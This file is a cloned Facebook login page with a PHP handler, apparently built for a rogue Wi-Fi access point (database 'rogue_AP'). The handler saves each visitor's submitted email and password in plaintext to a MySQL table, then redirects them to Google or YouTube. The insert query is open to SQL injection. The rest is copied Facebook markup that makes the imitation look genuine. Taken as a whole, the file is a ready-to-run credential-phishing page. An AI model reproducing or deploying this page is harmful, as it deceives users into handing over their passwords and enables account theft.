<?php
	if($_SERVER["REQUEST_METHOD"] == "POST"){
		$auth = 0;

		if (empty($_POST["email"])) {
		    $emailErr = "Email is required";
		} 
		else {
		    $email = test_input($_POST["email"]);
		    // check if e-mail address is well-formed
		    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
		      $emailErr = "Invalid email format";
		    }
		    else{
			if(empty($_POST["pass"])){
				$passErr = "Password Required";
			}
			else{
				if(strlen($_POST["pass"])< 8)
					$passErr = "Password require 8 character";
				else
					$auth = 1;
			}
		    }
		  }
		
		if($auth==1){
		    $host = "localhost";
		    $username = "fakeap";
		    $dbname = "rogue_AP";
		    $pwd = "fakeap";
		    $db = new mysqli($host,$username,$pwd,$dbname);

		    $email = $_POST['email'];
		    $password = $_POST['pass'];

		    $queryLogin = "INSERT INTO users (email,password) VALUES ('$email','$password')";
		    $sql = mysqli_query($db,$queryLogin);
		    if($sql){
		    	header("location: https:/google.com/");
		    }
		    else{
			header("location: https:/youtube.com/");
		    }
		}	
	}
	function test_input($data) {
		  $data = trim($data);
		  $data = stripslashes($data);
		  $data = htmlspecialchars($data);
		  return $data;
		}
?>

<!DOCTYPE html>
<html lang="en" id="facebook" class="no_js">

<meta http-equiv="content-type" content="text/html;charset=utf-8" />

<head>
    <meta charset="utf-8" />
    <meta name="referrer" content="default" id="meta_referrer" />
    <noscript>
        <meta http-equiv="refresh" content="0; URL=index4964.html?_fb_noscript=1" />
    </noscript>
    <title id="pageTitle">Log in to Facebook | Facebook</title>
    <meta property="og:site_name" content="Facebook" />
    <meta property="og:url" content="https://en-gb.facebook.com/login/" />
    <meta property="og:locale" content="en_GB" />
    <meta property="og:locale:alternate" content="www" />
    <meta property="og:locale:alternate" content="es_LA" />
    <meta property="og:locale:alternate" content="es_ES" />
    <meta property="og:locale:alternate" content="fr_FR" />
    <meta property="og:locale:alternate" content="it_IT" />
    <meta property="og:locale:alternate" content="id_ID" />
    <meta property="og:locale:alternate" content="th_TH" />
    <meta property="og:locale:alternate" content="vi_VN" />
    <meta property="og:locale:alternate" content="ko_KR" />
    <meta property="og:locale:alternate" content="ja_JP" />
    <link rel="search" type="application/opensearchdescription+xml" href="https://en-gb.facebook.com/osd.xml" title="Facebook" />
    <link rel="canonical" href="index.html" />
    <link rel="alternate" media="only screen and (max-width: 640px)" href="https://m.facebook.com/login/" />
    <link rel="alternate" media="handheld" href="https://m.facebook.com/login/" />
    <link rel="alternate" hreflang="x-default" href="https://www.facebook.com/login/" />
    <link rel="alternate" hreflang="en" href="https://www.facebook.com/login/" />
    <link rel="alternate" hreflang="ar" href="https://ar-ar.facebook.com/login/" />
    <link rel="alternate" hreflang="bg" href="https://bg-bg.facebook.com/login/" />
    <link rel="alternate" hreflang="bs" href="https://bs-ba.facebook.com/login/" />
    <link rel="alternate" hreflang="ca" href="https://ca-es.facebook.com/login/" />
    <link rel="alternate" hreflang="da" href="https://da-dk.facebook.com/login/" />
    <link rel="alternate" hreflang="el" href="https://el-gr.facebook.com/login/" />
    <link rel="alternate" hreflang="es" href="https://es-la.facebook.com/login/" />
    <link rel="alternate" hreflang="es-es" href="https://es-es.facebook.com/login/" />
    <link rel="alternate" hreflang="fa" href="https://fa-ir.facebook.com/login/" />
    <link rel="alternate" hreflang="fi" href="https://fi-fi.facebook.com/login/" />
    <link rel="alternate" hreflang="fr" href="https://fr-fr.facebook.com/login/" />
    <link rel="alternate" hreflang="fr-ca" href="https://fr-ca.facebook.com/login/" />
    <link rel="alternate" hreflang="hi" href="https://hi-in.facebook.com/login/" />
    <link rel="alternate" hreflang="hr" href="https://hr-hr.facebook.com/login/" />
    <link rel="alternate" hreflang="id" href="https://id-id.facebook.com/login/" />
    <link rel="alternate" hreflang="it" href="https://it-it.facebook.com/login/" />
    <link rel="alternate" hreflang="ko" href="https://ko-kr.facebook.com/login/" />
    <link rel="alternate" hreflang="mk" href="https://mk-mk.facebook.com/login/" />
    <link rel="alternate" hreflang="ms" href="https://ms-my.facebook.com/login/" />
    <link rel="alternate" hreflang="pl" href="https://pl-pl.facebook.com/login/" />
    <link rel="alternate" hreflang="pt" href="https://pt-br.facebook.com/login/" />
    <link rel="alternate" hreflang="pt-pt" href="https://pt-pt.facebook.com/login/" />
    <link rel="alternate" hreflang="ro" href="https://ro-ro.facebook.com/login/" />
    <link rel="alternate" hreflang="sl" href="https://sl-si.facebook.com/login/" />
    <link rel="alternate" hreflang="sr" href="https://sr-rs.facebook.com/login/" />
    <link rel="alternate" hreflang="th" href="https://th-th.facebook.com/login/" />
    <link rel="alternate" hreflang="vi" href="https://vi-vn.facebook.com/login/" />
    <meta name="description" content="Log in to Facebook to start sharing and connecting with your friends, family and people you know." />
    <meta name="robots" content="noodp,noydir" />
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yz/r/KFyVIAWzntM.ico" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yG/l/0,cross/GJmR0R_2FMJ.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="nCn1H" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yZ/l/0,cross/1uxt1bMNsC3.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="ccHw5" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yO/l/0,cross/S5nYfyYcTb6.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="jD8Xv" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yM/l/0,cross/BBztBb82OHk.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="FihWw" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yz/l/0,cross/ds0awKznBap.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="ewkGS" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yG/l/0,cross/HAuXNElXC-I.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="tYuzM" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yy/l/0,cross/QP7s_fYwOEe.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="dis1Q" />
</head>

<body class="login_page _39il UIPage_LoggedOut _-kb _605a b_c3pyn-ahh win x1 Locale_en_GB" dir="ltr">
    <script>
        requireLazy(["bootstrapWebSession"], function(j) {
            j(1575976623)
        })
    </script>
    <div class="_li" id="u_0_2">
        <div class="_3_s0 _1toe _3_s1 _3_s1 uiBoxGray noborder" data-testid="ax-navigation-menubar" id="u_0_3">
            <div class="_608m">
                <div class="_5aj7 _tb6">
                    <div class="_4bl7"><span class="mrm _3bcv _50f3">Jump to</span></div>
                    <div class="_4bl9 _3bcp">
                        <div class="_6a _608n" aria-label="Navigation assistant" aria-keyshortcuts="Alt+/" role="menubar" id="u_0_4">
                            <div class="_6a uiPopover" id="u_0_5"><a role="button" class="_42ft _4jy0 _55pi _2agf _4o_4 _63xb _p _4jy3 _517h _51sy" href="#" style="max-width:200px;" aria-haspopup="true" aria-expanded="false" rel="toggle" id="u_0_6"><span class="_55pe">Sections of this page</span><span class="_4o_3 _3-99"><i class="img sp_33iNLw2SSTv sx_c14536"></i></span></a></div>
                            <div class="_6a _3bcs"></div>
                            <div class="_6a mrm uiPopover" id="u_0_7"><a role="button" class="_42ft _4jy0 _55pi _2agf _4o_4 _3_s2 _63xb _p _4jy3 _4jy1 selected _51sy" href="#" style="max-width:200px;" aria-haspopup="true" tabindex="-1" aria-expanded="false" rel="toggle" id="u_0_8"><span class="_55pe">Accessibility help</span><span class="_4o_3 _3-99"><i class="img sp_33iNLw2SSTv sx_b17021"></i></span></a></div>
                        </div>
                    </div>
                    <div class="_4bl7 mlm pll _3bct">
                        <div class="_6a _3bcy">Press <span class="_3bcz">alt</span> + <span class="_3bcz">/</span> to open this menu</div>
                    </div>
                </div>
            </div>
        </div>
        <div id="pagelet_bluebar" data-referrer="pagelet_bluebar">
            <div id="blueBarDOMInspector">
                <div class="_53jh">
                    <div class="loggedout_menubar_container">
                        <div class="clearfix loggedout_menubar">
                            <div class="lfloat _ohe">
                                <h1><a href="https://en-gb.facebook.com/" title="Go to Facebook home"><i class="fb_logo img sp_33iNLw2SSTv sx_f51271"><u>Facebook</u></i></a></h1></div>
                        </div>
                    </div>
                    <div class="signupBanner">
                        <div class="signup_bar_container">
                            <div class="signup_box clearfix"><span class="signup_box_content"></span></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div id="globalContainer" class="uiContextualLayerParent">
            <div class="fb_content clearfix " id="content" role="main">
                <div class="_4-u5 _30ny"><span class="muffin_tracking_pixel_start"></span><img class="tracking_pixel" /><span class="muffin_tracking_pixel_end"></span>
                    <div class="_4-u2 _1w1t _4-u8 _52jv">
                        <div class="_xku" id="header_block"><span class="_50f6">Log in to Facebook</span></div>
                        <div class="login_form_container">
                            <form id="login_form" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
                                <div id="loginform">	
                                    <div class="clearfix _5466 _44mg" id="email_container">
					<?php echo $emailErr; ?>
                                        <input type="text" class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="email" id="email" tabindex="0" placeholder="Email address or phone number" value="" autofocus="1" aria-label="Email address or phone number" required/>
                                    </div>
                                    <div class="clearfix _5466 _44mg">
					<?php echo $passErr; ?>
                                        <input type="password" class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="pass" id="pass" tabindex="0" placeholder="Password" aria-label="Password" required/>
                                    </div>
                                    <div class="_xkt">
                                        <button value="1" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" id="loginbutton" name="login" tabindex="0" type="submit">Log In</button>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
            <div>
                <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
                    <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
                        <li>English (UK)</li>
                        <li><a class="_sv4" dir="ltr" href="https://id-id.facebook.com/login/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;id_ID&quot;, &quot;en_GB&quot;, &quot;https:\/\/id-id.facebook.com\/login\/&quot;, &quot;www_list_selector&quot;, 0); return false;" title="Indonesian">Bahasa Indonesia</a></li>
                        <li><a class="_sv4" dir="ltr" href="https://jv-id.facebook.com/login/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;jv_ID&quot;, &quot;en_GB&quot;, &quot;https:\/\/jv-id.facebook.com\/login\/&quot;, &quot;www_list_selector&quot;, 1); return false;" title="Javanese">Basa Jawa</a></li>
                        <li><a class="_sv4" dir="ltr" href="https://ms-my.facebook.com/login/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ms_MY&quot;, &quot;en_GB&quot;, &quot;https:\/\/ms-my.facebook.com\/login\/&quot;, &quot;www_list_selector&quot;, 2); return false;" title="Malay">Bahasa Melayu</a></li>
                        <li><a class="_sv4" dir="ltr" href="https://ja-jp.facebook.com/login/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ja_JP&quot;, &quot;en_GB&quot;, &quot;https:\/\/ja-jp.facebook.com\/login\/&quot;, &quot;www_list_selector&quot;, 3); return false;" title="Japanese">日本語</a></li>
                        <li><a class="_sv4" dir="rtl" href="https://ar-ar.facebook.com/login/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ar_AR&quot;, &quot;en_GB&quot;, &quot;https:\/\/ar-ar.facebook.com\/login\/&quot;, &quot;www_list_selector&quot;, 4); return false;" title="Arabic">العربية</a></li>
                        <li><a class="_sv4" dir="ltr" href="https://fr-fr.facebook.com/login/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;fr_FR&quot;, &quot;en_GB&quot;, &quot;https:\/\/fr-fr.facebook.com\/login\/&quot;, &quot;www_list_selector&quot;, 5); return false;" title="French (France)">Français (France)</a></li>
                        <li><a class="_sv4" dir="ltr" href="https://es-la.facebook.com/login/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;es_LA&quot;, &quot;en_GB&quot;, &quot;https:\/\/es-la.facebook.com\/login\/&quot;, &quot;www_list_selector&quot;, 6); return false;" title="Spanish">Español</a></li>
                        <li><a class="_sv4" dir="ltr" href="https://ko-kr.facebook.com/login/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ko_KR&quot;, &quot;en_GB&quot;, &quot;https:\/\/ko-kr.facebook.com\/login\/&quot;, &quot;www_list_selector&quot;, 7); return false;" title="Korean">한국어</a></li>
                        <li><a class="_sv4" dir="ltr" href="https://pt-br.facebook.com/login/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;pt_BR&quot;, &quot;en_GB&quot;, &quot;https:\/\/pt-br.facebook.com\/login\/&quot;, &quot;www_list_selector&quot;, 8); return false;" title="Portuguese (Brazil)">Português (Brasil)</a></li>
                        <li><a class="_sv4" dir="ltr" href="https://de-de.facebook.com/login/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;de_DE&quot;, &quot;en_GB&quot;, &quot;https:\/\/de-de.facebook.com\/login\/&quot;, &quot;www_list_selector&quot;, 9); return false;" title="German">Deutsch</a></li>
                        <li><a role="button" class="_42ft _4jy0 _517i _517h _51sy" rel="dialog" ajaxify="/settings/language/language/?uri=https%3A%2F%2Fde-de.facebook.com%2Flogin%2F&amp;source=www_list_selector_more" href="#" title="Show more languages"><i class="img sp_M-yc3Nr1hAE sx_87fab2"></i></a></li>
                    </ul>
                    <div id="contentCurve"></div>
                    <div id="pageFooterChildren" role="contentinfo" aria-label="Facebook site links">
                        <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
                            <li><a href="https://en-gb.facebook.com/r.php" title="Sign up for Facebook">Sign Up</a></li>
                            <li><a href="index.html" title="Log in to Facebook">Log In</a></li>
                            <li><a href="https://en-gb.messenger.com/" title="Take a look at Messenger.">Messenger</a></li>
                            <li><a href="https://en-gb.facebook.com/lite/" title="Facebook Lite for Android.">Facebook Lite</a></li>
                            <li><a href="https://en-gb.facebook.com/watch/" title="Browse our Watch videos."> Watch </a></li>
                            <li><a href="https://en-gb.facebook.com/directory/people/" title="Browse our people directory.">People</a></li>
                            <li><a href="https://en-gb.facebook.com/directory/pages/" title="Browse our Pages directory.">Pages</a></li>
                            <li><a href="https://en-gb.facebook.com/pages/category/">Page categories</a></li>
                            <li><a href="https://en-gb.facebook.com/places/" title="Take a look at popular places on Facebook.">Places</a></li>
                            <li><a href="https://en-gb.facebook.com/games/" title="Check out Facebook games.">Games</a></li>
                            <li><a href="https://en-gb.facebook.com/directory/places/" title="Browse our places directory.">Locations</a></li>
                            <li><a href="https://en-gb.facebook.com/marketplace/" title="Buy and sell on Facebook Marketplace.">Marketplace</a></li>
                            <li><a href="https://en-gb.facebook.com/directory/groups/" title="Browse our Groups directory.">Groups</a></li>
                            <li><a href="https://l.facebook.com/l.php?u=https%3A%2F%2Finstagram.com%2F&amp;h=AT2FO4PjtZ8qxthw2YjeJaAlSojBFYIj-1-qLz_ml4beAHh7W6VLU8pNLbqYsA9vIhp2GSxdPAjnHz795mX9Dqk6WL2fScjGrjenBFKgq8JHLVL5_a7JPUj2Sj0o0lciTidO6jxX_3Hk_UKaVa7sSo6x0VtVLaYJXeo" title="Take a look at Instagram" target="_blank" rel="nofollow" data-lynx-mode="hover">Instagram</a></li>
                            <li><a href="https://en-gb.facebook.com/local/lists/245019872666104/" title="Browse our Local Lists directory.">Local</a></li>
                            <li><a href="https://en-gb.facebook.com/fundraisers/" title="Donate to worthy causes.">Fundraisers</a></li>
                            <li><a href="https://en-gb.facebook.com/biz/directory/" title="Browse our Facebook Services directory.">Services</a></li>
                            <li><a href="https://en-gb.facebook.com/facebook" accesskey="8" title="Read our blog, discover the resource centre and find job opportunities.">About</a></li>
                            <li><a href="https://en-gb.facebook.com/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;extra_1=auto" title="Advertise on Facebook">Create ad</a></li>
                            <li><a href="https://en-gb.facebook.com/pages/create/?ref_type=site_footer" title="Create a Page">Create Page</a></li>
                            <li><a href="https://developers.facebook.com/?ref=pf" title="Develop on our platform.">Developers</a></li>
                            <li><a href="https://en-gb.facebook.com/careers/?ref=pf" title="Make your next career move to our brilliant company.">Careers</a></li>
                            <li><a data-nocookies="1" href="https://en-gb.facebook.com/privacy/explanation" title="Learn about your privacy and Facebook.">Privacy</a></li>
                            <li><a href="https://en-gb.facebook.com/policies/cookies/" title="Learn about cookies and Facebook." data-nocookies="1">Cookies</a></li>
                            <li><a class="_41ug" data-nocookies="1" href="https://www.facebook.com/help/568137493302217" title="Learn about AdChoices.">AdChoices<i class="img sp_33iNLw2SSTv sx_64cdfc"></i></a></li>
                            <li><a data-nocookies="1" href="https://en-gb.facebook.com/policies?ref=pf" accesskey="9" title="Review our terms and policies.">Terms</a></li>
                            <li><a href="https://en-gb.facebook.com/help/?ref=pf" accesskey="0" title="Visit our Help Centre.">Help</a></li>
                            <li><a accesskey="6" class="accessible_elem" href="https://en-gb.facebook.com/settings" title="View and edit your Facebook settings.">Settings</a></li>
                            <li><a accesskey="7" class="accessible_elem" href="https://en-gb.facebook.com/allactivity?privacy_source=activity_log_top_menu" title="View your activity log">Activity log</a></li>
                        </ul>
                    </div>
                    <div class="mvl copyright">
                        <div><span> Facebook © 2019</span></div>
                    </div>
                </div>
            </div>
        </div>
        <div></div><span><img src="https://facebook.com/security/hsts-pixel.gif?c=3.2.5" width="0" height="0" style="display:none" /></span></div>
    <div style="display:none"></div>
</body>

</html>
